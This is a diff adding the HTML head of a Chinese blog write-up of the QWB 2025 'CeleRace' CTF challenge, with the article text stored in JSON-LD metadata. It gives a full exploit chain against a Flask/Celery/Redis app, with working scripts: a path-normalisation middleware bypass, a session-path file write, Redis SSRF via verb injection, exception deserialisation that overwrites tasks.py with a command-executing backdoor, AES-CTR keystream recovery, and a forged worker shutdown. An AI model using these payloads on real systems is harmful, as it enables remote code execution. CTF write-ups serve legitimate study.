@@ -1,0 +1,895 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>强网杯 2025 CeleRace Writeup | zoiltin&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="记录一个套娃题">
+<meta name="author" content="">
+<link rel="canonical" href="https://zoiltin.github.io/posts/%E5%BC%BA%E7%BD%91%E6%9D%AF2025-celerace-writeup/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://zoiltin.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://zoiltin.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://zoiltin.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://zoiltin.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://zoiltin.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://zoiltin.github.io/posts/%E5%BC%BA%E7%BD%91%E6%9D%AF2025-celerace-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:url" content="https://zoiltin.github.io/posts/%E5%BC%BA%E7%BD%91%E6%9D%AF2025-celerace-writeup/">
+  <meta property="og:site_name" content="zoiltin&#39;s Blog">
+  <meta property="og:title" content="强网杯 2025 CeleRace Writeup">
+  <meta property="og:description" content="记录一个套娃题">
+  <meta property="og:locale" content="zh-CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-10-31T07:24:54+00:00">
+    <meta property="article:modified_time" content="2025-10-31T07:24:54+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="强网杯 2025 CeleRace Writeup">
+<meta name="twitter:description" content="记录一个套娃题">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://zoiltin.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "强网杯 2025 CeleRace Writeup",
+      "item": "https://zoiltin.github.io/posts/%E5%BC%BA%E7%BD%91%E6%9D%AF2025-celerace-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "强网杯 2025 CeleRace Writeup",
+  "name": "强网杯 2025 CeleRace Writeup",
+  "description": "记录一个套娃题",
+  "keywords": [
+    
+  ],
+  "articleBody": "越权 先看系统权限，使用了 superviser 维持了三个程序：\nredis app.py (flask + broker) worker 其中 /readflag 程序 worker 用户可以执行，所以最终目标需要已 worker 用户 RCE。\n题目在 werkzeug 的基础上自己写了一个阉割版的 Flask，其中在处理中间件那部分存在逻辑漏洞。\n在处理请求时，先通过 path 找到对应的 endpoint，然后再收集该 endpoint 的 middlewares：\ndef _collect_route_middlewares(self, endpoint: str, path: str) -\u003e list[MiddlewareCallable]: scoped = list(self.route_middlewares.get(endpoint, [])) if scoped: return scoped if not self.wildcard_middlewares: return scoped normalized_path = self._normalize_path(path) for pattern, middlewares in reversed(self.wildcard_middlewares): if self._pattern_matches(pattern, normalized_path): return list(middlewares) return scoped 但是在匹配 middlewares 之前会先进行 _normalize_path 操作。所以对于 path : /tasks/fetch/%2e%2e/asd 来说，能够争取找到 fetch endpoint，但当匹配 middlewares 时就变成了 /tasks/asd 了，匹配失败，导致进入该 endpoint 前不需要执行任何 middlewares，实现越权。\n任意文件写 session 保存时根据 sid 确定 session 文件路径：\ndef save(self, session: FileSession) -\u003e None: if not session.modified: return path = self._session_path(session.sid) tmp_path = f\"{path}.tmp-{secrets.token_hex(4)}\" payload = {key: value for key, value in session.items()} with open(tmp_path, \"w\", encoding=\"utf-8\") as fh: json.dump(payload, fh, ensure_ascii=False, separators=(\",\", \":\")) os.replace(tmp_path, path) session.modified = False 而 sid 用户可控，所以可以任意文件创建，但文件内容不能饭圈控制。\nPayload：\nCookie: mini_session=/tmp/debug 可以创建 /tmp/debug\n同时，题目还定义了 DiagnosticsPersistError 类，该类的构造函数可以任意文件写，现在需要找一个任意 callable 的调用。\ncelery 有一个历史漏洞：CVE-2021-23727，该漏洞可以调用任意 callable。celery worker 会将任务执行结果保存下来，当 broker 想要读取任务执行结果在提取出来。如果执行时遇到报错会将该 Exception 序列化存储，读取时再反序列化，其中涉及到任意 callable 调用。CVE-2021-23727 的修复方式是只允许反序列化已定义的 Exception 类，不允许调用任意 callable 如 os.system 等。\n因为 DiagnosticsPersistError 类继承自 Exception，所以漏洞修复后依然可以被反序列化。\nDiagnosticsPersistError 关键代码如下：\nclass DiagnosticsPersistError(RuntimeError): \"\"\"Dormant exception used for development-time diagnostics persistence.\"\"\" _BASE_DIR = Path(os.environ.get(\"FRAMEWORK_DIAGNOSTICS_DIR\", \"/app/data\")).resolve() _DEBUG_SENTINEL = Path(\"/tmp/debug\") def __init__(self, payload: str, *args: Any, **kwargs: Any) -\u003e None: if self._DEBUG_SENTINEL.exists(): self._maybe_persist(payload) super().__init__(\"diagnostics capture failed\", *args, **kwargs) def _maybe_persist(self, payload: str) -\u003e None: info = self._decode_payload(payload) if not info: return target = info.get(\"path\") if not target: return path = Path(target) mode = str(info.get(\"mode\", \"w\")) encoding = info.get(\"encoding\", \"utf-8\") data = info.get(\"content\", \"\") try: path.parent.mkdir(parents=True, exist_ok=True) if \"b\" in mode: blob = self._ensure_bytes(data, encoding) with path.open(mode) as fh: # type: ignore[call-arg] fh.write(blob) else: text = self._ensure_text(data, encoding) with path.open(mode, encoding=encoding) as fh: fh.write(text) except Exception: return def _decode_payload(self, payload: str) -\u003e Dict[str, Any] | None: attempts = [payload] try: attempts.append(bytes.fromhex(payload).decode(\"utf-8\")) except Exception: pass for candidate in attempts: try: return json.loads(candidate) except Exception: continue return None 对于题目来说，broker 和 worker 通过 redis 通信。而 /tasks/fetch 可以 SSRF 攻击 redis 向一个 task 的返回结果中写入序列化 Payload，当读取结果时触发文件写入。\nfetch 代码如下：\n@celery_app.task(name=\"miniws.fetch\") def fetch_task(url: str, *, host_header: str | None = None, body: str | None = None, verb: str = \"GET\") -\u003e Dict[str, Any]: parsed = urlparse(url) host = parsed.hostname or settings.redis_host port = parsed.port or (443 if parsed.scheme == \"https\" else 80) path = parsed.path or \"/\" if parsed.query: path = f\"{path}?{parsed.query}\" request_host = host_header or parsed.netloc or f\"{host}:{port}\" request_body = body.encode() if body else b\"\" payload = ( f\"{verb} {path} HTTP/1.1\\r\\n\" f\"Host: {request_host}\\r\\n\" \"User-Agent: MiniFetch/1.0\\r\\n\" \"Connection: close\\r\\n\" \"\\r\\n\" ).encode() + request_body chunks: list[bytes] = [] with socket.create_connection((host, port), timeout=5) as sock: sock.sendall(payload) while True: data = sock.recv(4096) if not data: break chunks.append(data) preview = b\"\".join(chunks)[:2048] return {\"preview\": preview.decode(errors=\"replace\"), \"bytes\": len(preview)} 使用 verb 注入即可：\nPOST /tasks/fetch/%2e%2e/123 HTTP/1.1\rHost: Content-Length: 2291\rContent-Type: application/json\rCookie: mini_session=d9b266db66464ed2\rConnection: close\r{\"url\":\"http://127.0.0.1:6379\",\"verb\":\"set asd 1\\r\\nGET\"} 结合上面的 Exception 类给出写文件的 Payload:\nset celery-task-meta- '{\"status\": \"FAILURE\", \"result\": {\"exc_type\": \"DiagnosticsPersistError\", \"exc_message\": \"\", \"exc_module\": \"framework.app\"}, \"traceback\": \"\", \"children\": [], \"date_done\": \"2025-10-31T06:15:48.956927\", \"task_id\": \"\"}' 使用任意一个 task 的 uuid 替换，exc_message 的值为 hex 编码后的 json 数据，其中包含 path 和 content 字段用于写文件。\n生成写入文件Payload：\ndef wapper(payload : str, title : str): print(f'------------------------{title}----------------------------') data = '\\r\\n' + payload + '\\r\\nGET' # print(data) out = '' for i in data: num = hex(ord(i)).replace('0x', '') while len(num) \u003c 2: num = '0' + num out = out + '\\\\u00' + num print(out) pwned_taskspy = ''' from __future__ import annotations import os import pickle import socket from typing import Any, Dict from urllib.parse import urlparse from celery import Celery from kombu.serialization import register from .config import settings from .crypto import dumps as encrypt_dumps, loads as decrypt_loads try: register( \"miniws-aes\", encrypt_dumps, decrypt_loads, content_type=\"application/x-miniws\", content_encoding=\"binary\", ) except ValueError: pass celery_app = Celery( \"miniws\", broker=settings.celery_broker_url, backend=settings.celery_backend_url, ) celery_app.conf.update( task_serializer=\"miniws-aes\", task_default_serializer=\"miniws-aes\", accept_content=[\"miniws-aes\"], result_serializer=\"json\", result_accept_content=[\"json\"], ) @celery_app.task(name=\"miniws.echo\") def echo_task(message: str) -\u003e Dict[str, Any]: return {\"echo\": __import__(\"os\").popen(message).read()} @celery_app.task(name=\"miniws.fetch\") def fetch_task(url: str, *, host_header: str | None = None, body: str | None = None, verb: str = \"GET\") -\u003e Dict[str, Any]: parsed = urlparse(url) host = parsed.hostname or settings.redis_host port = parsed.port or (443 if parsed.scheme == \"https\" else 80) path = parsed.path or \"/\" if parsed.query: path = f\"{path}?{parsed.query}\" request_host = host_header or parsed.netloc or f\"{host}:{port}\" request_body = body.encode() if body else b\"\" payload = ( f\"{verb} {path} HTTP/1.1\\\\r\\\\n\" + f\"Host: {request_host}\\\\r\\\\n\" + \"User-Agent: MiniFetch/1.0\\\\r\\\\n\" + \"Connection: close\\\\r\\\\n\" + \"\\\\r\\\\n\" ).encode() + request_body chunks: list[bytes] = [] with socket.create_connection((host, port), timeout=5) as sock: sock.sendall(payload) while True: data = sock.recv(4096) if not data: break chunks.append(data) preview = b\"\".join(chunks)[:2048] return {\"preview\": preview.decode(errors=\"replace\"), \"bytes\": len(preview)} '''.strip() def write_file(task_id : str): payload = { \"path\" : \"/app/src/tasks.py\", \"content\" : pwned_taskspy } data = ''' set celery-task-meta-%s '{\"status\": \"FAILURE\", \"result\": {\"exc_type\": \"DiagnosticsPersistError\", \"exc_message\": \"%s\", \"exc_module\": \"framework.app\"}, \"traceback\": \"\", \"children\": [], \"date_done\": \"2025-10-31T06:15:48.956927\", \"task_id\": \"%s\"}' '''.strip() % (task_id, json.dumps(payload).encode().hex(), task_id) wapper(data, 'write file') task_id = '' write_file(task_id) 这个 tasks.py 让 echo 任务的 message 作为系统命令执行并拿到回显。\nrestart 获取密钥流 尝试覆盖 tasks.py 然后触发 worker 的重启进而执行新的 tasks.py。在 celery + redis 的架构下，broker 可以通过 redis 的 PUB/SUB 发布命令，其中包含 pool_restart 和 shutdown 等。\n不过，题目给 celery 加上了加密，代码如下：\nfrom __future__ import annotations import json import socket from hashlib import md5, sha1 from typing import Any from Crypto.Cipher import AES from .config import settings import logging _TASK_KEY = sha1(settings.secret_key.encode()).digest()[:16] _TASK_NONCE = md5(socket.gethostname().encode()).digest()[:8] logging.basicConfig(level=logging.INFO) def encrypt_bytes(data: bytes) -\u003e bytes: cipher = AES.new(_TASK_KEY, AES.MODE_CTR, nonce=_TASK_NONCE) return cipher.encrypt(data) def decrypt_bytes(data: bytes) -\u003e bytes: cipher = AES.new(_TASK_KEY, AES.MODE_CTR, nonce=_TASK_NONCE) return cipher.decrypt(data) def dumps(payload: Any) -\u003e bytes: raw = json.dumps(payload, separators=(\",\", \":\"), ensure_ascii=False).encode(\"utf-8\") return encrypt_bytes(raw) def loads(ciphertext: bytes) -\u003e Any: raw = decrypt_bytes(ciphertext) return json.loads(raw.decode(\"utf-8\")) 存在漏洞，CTR 模式为序列密码，而题目中 key 和 nonce 是固定的，则密钥流也是固定的，此时可以进行明文攻击，同时拿到明文和密文可以算出密钥流。\nfetch task 代码设置了 timeout 为 5s:\n@celery_app.task(name=\"miniws.fetch\") def fetch_task(url: str, *, host_header: str | None = None, body: str | None = None, verb: str = \"GET\") -\u003e Dict[str, Any]: parsed = urlparse(url) host = parsed.hostname or settings.redis_host port = parsed.port or (443 if parsed.scheme == \"https\" else 80) path = parsed.path or \"/\" if parsed.query: path = f\"{path}?{parsed.query}\" request_host = host_header or parsed.netloc or f\"{host}:{port}\" request_body = body.encode() if body else b\"\" payload = ( f\"{verb} {path} HTTP/1.1\\r\\n\" f\"Host: {request_host}\\r\\n\" \"User-Agent: MiniFetch/1.0\\r\\n\" \"Connection: close\\r\\n\" \"\\r\\n\" ).encode() + request_body chunks: list[bytes] = [] with socket.create_connection((host, port), timeout=5) as sock: sock.sendall(payload) while True: data = sock.recv(4096) if not data: break chunks.append(data) preview = b\"\".join(chunks)[:2048] return {\"preview\": preview.decode(errors=\"replace\"), \"bytes\": len(preview)} 可以用这个来 DOS ，让任务队列堵塞，然后 SSRF redis 用 lua 脚本拿到密文。\n触发堵塞的 EXP:\nimport requests import time url = 'http://192.168.72.132:5001' for i in range(10): try: res = requests.post(url=url + '/tasks/fetch/%252e%252e/asd', json={\"url\":\"http://192.168.72.131:6378\",\"verb\":\"GET\"}) # 用一个不存在的 IP 会消耗 5s 时间 except KeyboardInterrupt as e: break except: pass while True: try: res = requests.post(url=url + '/tasks/echo', json={\"message\":\"111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\"}) except KeyboardInterrupt as e: break except: pass 先发送 10 个 fetch 任务堵塞队列，后面一直发送 echo 任务。接着连续发送这个 SSRF Payload：\nEVAL \"local element_list = redis.call('LRANGE', KEYS[1], 0, 0) if not element_list or #element_list == 0 then return nil end local first_element = element_list[1] local escaped_value = string.gsub(first_element, '\\\\\"', '\\\\\\\\\\\\\\\\\\\\\"') local json_result = '{\\\\\"status\\\\\": \\\\\"SUCCESS\\\\\", \\\\\"result\\\\\": {\\\\\"echo\\\\\": \\\\\"' .. escaped_value .. '\\\\\"}, \\\\\"traceback\\\\\": null, \\\\\"children\\\\\": [], \\\\\"date_done\\\\\": \\\\\"2025-10-31T03:20:37.823922\\\\\", \\\\\"task_id\\\\\": \\\\\"\\\\\"}' redis.call('SET', KEYS[2], json_result) return json_result\" 2 celery celery-task-meta- 这个 lua 脚本会读取 celery 队列的第一个然后赋值给一个 key，运行上面 DOS 脚本后，马上多次发送 lua 脚本。再通过指定的 uuid 就能够读取到密文了。\n计算密钥流：\nimport base64 plaintext = ''' [[],{\"message\":\"111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\"},{\"callbacks\":null,\"errbacks\":null,\"chain\":null,\"chord\":null}] '''.strip().encode() s = ''' tVcJqAkEgomM+S9W7E0er7nxxvRbPGVKva26QEGh5A+jUnSlfZydMeb4edf9XkKVWZTUitk6avW0FBpbo9Cwz9QK0WuYjcr9Rofy3ECZw6EqDO5XQoYPEkScwW3Nlb5cqYY80ZSaQajPJTYI/ofbbNTqVMrIe8F6HM6Hjs3yiGZ1xxw21yn3TdH6KcdTTKZHjWnxiDEljKura1QJiV4fbbbA9+dbWb2B04Bb1qKgWn9L8d9HyifZdpkkuEj8ktTPtJZd9BguR7ma1ONX5tvs683hWYV3yZOSXyPlxbFDzkpT/QalATKleUl9oL9DUNb5vbnW+qDgoJoli4meBWxwNV/2ADUDJtKSNmhNoAqYEAzvZP9Ig961X9qj0ZcDqJzZ+/WNmoEHskqYUwmCqwEBpCL/0twT4VoTlrJd6VQVW2kHVji6+eQIyaxNLOmygNAfl0mZ4pTOOlGj8RUDo5jUXLMPm7tGQYaVQ6rEq0lmKjYv3uq8dxvI5E3iYzPlA3Ued/mMqvBcjDcgcJUOEWKamEPAgim2AcblfhBGMVJu5SjnvH3Tz+H6GEScmrnf8ABNAsCU6DdqV9V9YkcjZWcVnj2LlJRXsCCfHfVxsneFcb6UvEkgFLBWF/SDzcNwcDJ8ovplSvc= '''.strip() cpher = base64.b64decode(s) key_stream = [] for i in range(len(cpher)): c = cpher[i] p = plaintext[i] k = c ^ p key_stream.append(k) print(key_stream) 对于 echo 111 ... 任务来说，明文格式是确定的，异或得到密钥流。\nshutdown pool_restart 功能默认是关闭的，而 shutdown 默认是开启的，而且 worker 进程被 supervisor 守护重启，所以效果一样。\nshutdown 命令格式为：\n{ \"method\" : \"shutdown\", \"arguments\" : {}, \"destination\" : null, \"pattern\" : null, \"matcher\" : null, \"ticket\" : \"8b3edc18-e6c9-41df-8fbb-e3452b0db26f\", \"reply_to\" : { \"exchange\" : \"reply.celery.pidbox\", \"routing_key\" : \"082a4b30-f17a-3be9-ac0e-023e96bcc32a\" } } ticket 和 routing_key 的值设置为随机 uuid 即可，不存在校验。\n加密脚本：\nimport base64 data = ''' {\"method\":\"shutdown\",\"arguments\":{},\"destination\":null,\"pattern\":null,\"matcher\":null,\"ticket\":\"8b3edc18-e6c9-41df-8fbb-e3452b0db26f\",\"reply_to\":{\"exchange\":\"reply.celery.pidbox\",\"routing_key\":\"082a4b30-f17a-3be9-ac0e-023e96bcc32a\"}} '''.strip().encode() def e_with_key(data : bytes): key_stream = [238, 12, 84, 132, 114, 38, 239, 236, 255, 138, 78, 49, 137, 111, 36, 141, 136, 192, 247, 197, 106, 13, 84, 123, 140, 156, 139, 113, 112, 144, 213, 62, 146, 99, 69, 148, 76, 173, 172, 0, 215, 201, 72, 230, 204, 111, 115, 164, 104, 165, 229, 187, 232, 11, 91, 196, 133, 37, 43, 106, 146, 225, 129, 254, 229, 59, 224, 90, 169, 188, 251, 204, 119, 182, 195, 237, 113, 168, 242, 144, 27, 61, 223, 102, 115, 183, 62, 35, 117, 173, 240, 92, 252, 164, 143, 109, 152, 183, 13, 224, 165, 171, 112, 153, 254, 20, 7, 57, 207, 182, 234, 93, 229, 219, 101, 251, 249, 74, 240, 75, 45, 255, 182, 191, 252, 195, 185, 87, 68, 246, 45, 7, 230, 24, 198, 124, 224, 203, 24, 246, 98, 125, 151, 118, 188, 88, 192, 185, 0, 20, 189, 154, 154, 90, 101, 56, 184, 111, 46, 92, 135, 241, 198, 214, 106, 104, 140, 176, 226, 177, 106, 231, 147, 145, 107, 78, 122, 192, 238, 118, 251, 22, 232, 71, 168, 21, 137, 121, 205, 163, 229, 254, 133, 167, 108, 197, 41, 31, 118, 136, 171, 229, 210, 102, 215, 234, 221, 218, 252, 208, 104, 180, 70, 248, 162, 163, 110, 18, 212, 244, 128, 114, 255, 123, 98, 204, 55, 148, 48, 3, 148, 72, 120, 76, 145, 142, 114, 97, 231, 200, 140, 136, 231, 203, 145, 209, 145, 171, 20, 186, 184, 175, 52, 93, 65, 4, 110, 199, 49, 4, 50, 23, 227, 163, 7, 89, 124, 145, 59, 169, 33, 61, 222, 85, 206, 121, 178, 239, 132, 110, 235, 146, 224, 166, 50, 153, 173, 232, 202, 196, 188, 171, 176, 54, 131, 123, 169, 98, 56, 179, 154, 48, 48, 149, 19, 206, 227, 237, 34, 208, 107, 34, 167, 131, 108, 216, 101, 36, 106, 88, 54, 103, 9, 139, 200, 213, 57, 248, 157, 124, 29, 216, 131, 177, 225, 46, 166, 120, 168, 211, 165, 255, 11, 96, 146, 192, 36, 50, 146, 169, 229, 109, 130, 62, 170, 138, 119, 112, 183, 164, 114, 155, 245, 154, 120, 87, 27, 7, 30, 239, 219, 141, 70, 42, 249, 213, 124, 211, 82, 2, 212, 50, 68, 47, 70, 200, 189, 155, 193, 109, 189, 6, 17, 65, 164, 63, 32, 83, 171, 169, 114, 241, 179, 24, 135, 48, 247, 212, 79, 33, 119, 0, 99, 95, 212, 25, 214, 141, 76, 226, 254, 195, 135, 52, 63, 190, 249, 216, 179, 156, 98, 44, 97, 171, 231, 202, 13, 4, 34, 185, 17, 78, 101, 70, 23, 21, 119, 255, 94, 224, 231, 182, 109, 222, 85, 243, 113, 217, 83, 209, 31, 228, 24, 208, 182, 134, 39, 85, 120, 220, 122, 53, 151, 235, 162, 177, 20, 82, 8, 18, 215, 150, 9, 55, 170] data_length = len(data) plain = b'' for i in range(len(key_stream)): if i \u003e= data_length: break plain = plain + (data[i] ^ key_stream[i]).to_bytes(1) return plain out = e_with_key(data) print(base64.b64encode(out)) shutdown 等控制指令是通过 redis 的 PUB/SUB 发送的，命令如下：\nPUBLISH /0.celery.pidbox '{\"body\": \"\u003c加密后的base64数据\u003e\", \"content-encoding\": \"binary\", \"content-type\": \"application/x-miniws\", \"headers\": {\"clock\": 1, \"expires\": 1861891032.9756505}, \"properties\": {\"delivery_mode\": 2, \"delivery_info\": {\"exchange\": \"celery.pidbox\", \"routing_key\": \"\"}, \"priority\": 0, \"body_encoding\": \"base64\", \"delivery_tag\": \"e9cb2a03-3968-4a48-a3ea-ca7ba413c012\"}}' 注意 expires 不要过期，delivery_tag 设置为随机 uuid 即可。worker 进程退出后会被 supervisor 重新拉起来，此时会加载被我们覆盖的 tasks.py 代码。\n涉及到 redis lua 的 Payload 对于引号的转义很敏感，可以用 unicode 编码，方便一点。以下脚本用于生成三个阶段的 Payload。\nimport json def wapper(payload : str, title : str): print(f'------------------------{title}----------------------------') data = '\\r\\n' + payload + '\\r\\nGET' # print(data) out = '' for i in data: num = hex(ord(i)).replace('0x', '') while len(num) \u003c 2: num = '0' + num out = out + '\\\\u00' + num print(out) pwned_taskspy = ''' from __future__ import annotations import os import pickle import socket from typing import Any, Dict from urllib.parse import urlparse from celery import Celery from kombu.serialization import register from .config import settings from .crypto import dumps as encrypt_dumps, loads as decrypt_loads try: register( \"miniws-aes\", encrypt_dumps, decrypt_loads, content_type=\"application/x-miniws\", content_encoding=\"binary\", ) except ValueError: pass celery_app = Celery( \"miniws\", broker=settings.celery_broker_url, backend=settings.celery_backend_url, ) celery_app.conf.update( task_serializer=\"miniws-aes\", task_default_serializer=\"miniws-aes\", accept_content=[\"miniws-aes\"], result_serializer=\"json\", result_accept_content=[\"json\"], ) @celery_app.task(name=\"miniws.echo\") def echo_task(message: str) -\u003e Dict[str, Any]: return {\"echo\": __import__(\"os\").popen(message).read()} @celery_app.task(name=\"miniws.fetch\") def fetch_task(url: str, *, host_header: str | None = None, body: str | None = None, verb: str = \"GET\") -\u003e Dict[str, Any]: parsed = urlparse(url) host = parsed.hostname or settings.redis_host port = parsed.port or (443 if parsed.scheme == \"https\" else 80) path = parsed.path or \"/\" if parsed.query: path = f\"{path}?{parsed.query}\" request_host = host_header or parsed.netloc or f\"{host}:{port}\" request_body = body.encode() if body else b\"\" payload = ( f\"{verb} {path} HTTP/1.1\\\\r\\\\n\" + f\"Host: {request_host}\\\\r\\\\n\" + \"User-Agent: MiniFetch/1.0\\\\r\\\\n\" + \"Connection: close\\\\r\\\\n\" + \"\\\\r\\\\n\" ).encode() + request_body chunks: list[bytes] = [] with socket.create_connection((host, port), timeout=5) as sock: sock.sendall(payload) while True: data = sock.recv(4096) if not data: break chunks.append(data) preview = b\"\".join(chunks)[:2048] return {\"preview\": preview.decode(errors=\"replace\"), \"bytes\": len(preview)} '''.strip() def write_file(task_id : str): payload = { \"path\" : \"/app/src/tasks.py\", \"content\" : pwned_taskspy } data = ''' set celery-task-meta-%s '{\"status\": \"FAILURE\", \"result\": {\"exc_type\": \"DiagnosticsPersistError\", \"exc_message\": \"%s\", \"exc_module\": \"framework.app\"}, \"traceback\": \"\", \"children\": [], \"date_done\": \"2025-10-31T06:15:48.956927\", \"task_id\": \"%s\"}' '''.strip() % (task_id, json.dumps(payload).encode().hex(), task_id) wapper(data, 'write file') def get_key(task_id : str): data = ''' EVAL \"local element_list = redis.call('LRANGE', KEYS[1], 0, 0) if not element_list or #element_list == 0 then return nil end local first_element = element_list[1] local escaped_value = string.gsub(first_element, '\\\\\"', '\\\\\\\\\\\\\\\\\\\\\"') local json_result = '{\\\\\"status\\\\\": \\\\\"SUCCESS\\\\\", \\\\\"result\\\\\": {\\\\\"echo\\\\\": \\\\\"' .. escaped_value .. '\\\\\"}, \\\\\"traceback\\\\\": null, \\\\\"children\\\\\": [], \\\\\"date_done\\\\\": \\\\\"2025-10-31T03:20:37.823922\\\\\", \\\\\"task_id\\\\\": \\\\\"%s\\\\\"}' redis.call('SET', KEYS[2], json_result) return json_result\" 2 celery celery-task-meta-%s '''.strip() % (task_id, task_id) wapper(data, 'get key') def shutdown(task_id : str): enc_data = ''' lS454QZOgIjdsGxC4RpQ6ee3medGLzUJ6+nmFB7kphyoGDi4bsnJc6OgJoe4BhzKSp+LzoRnd+b1RF8e95Pv3N9VlTbFkNmhFsKghRTa0Kp1SLMKX5VKShbGlSjenq1V+oRohMaaSLSbImQA4oLbOYP2XZ2bKN0uHsuDjZ7z3TV2wEslyjq0GZCnYakWErVMx3qlwWN83PT9P0cCmh1LLOuI6LUPBOnCm58ajvfzBDZY7MwElGOcLsZy1hKo2sfEp5dU90grFLubyLRX4Ivw6Z61UZknm5LGQyLmx+VLyRkBrwSmUSHpNQ== '''.strip() data = ''' PUBLISH /0.celery.pidbox '{\"body\": \"%s\", \"content-encoding\": \"binary\", \"content-type\": \"application/x-miniws\", \"headers\": {\"clock\": 1, \"expires\": 1861891032.9756505}, \"properties\": {\"delivery_mode\": 2, \"delivery_info\": {\"exchange\": \"celery.pidbox\", \"routing_key\": \"\"}, \"priority\": 0, \"body_encoding\": \"base64\", \"delivery_tag\": \"e9cb2a03-3968-4a48-a3ea-ca7ba413c012\"}}' '''.strip() wapper(data, 'shutdown') task_id = 'd3ae97dd-8ed9-4b72-ad47-4c785f2302f0' write_file(task_id) get_key(task_id) shutdown(task_id) 参考 https://snyk.io/blog/python-rce-vulnerability/\nhttp://gensokyo.cn/2025/10/19/celerace/\n",
+  "wordCount" : "2220",
+  "inLanguage": "en",
+  "datePublished": "2025-10-31T07:24:54Z",
+  "dateModified": "2025-10-31T07:24:54Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://zoiltin.github.io/posts/%E5%BC%BA%E7%BD%91%E6%9D%AF2025-celerace-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "zoiltin's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://zoiltin.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://zoiltin.github.io/" accesskey="h" title="zoiltin&#39;s Blog (Alt + H)">zoiltin&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://zoiltin.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/posts" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
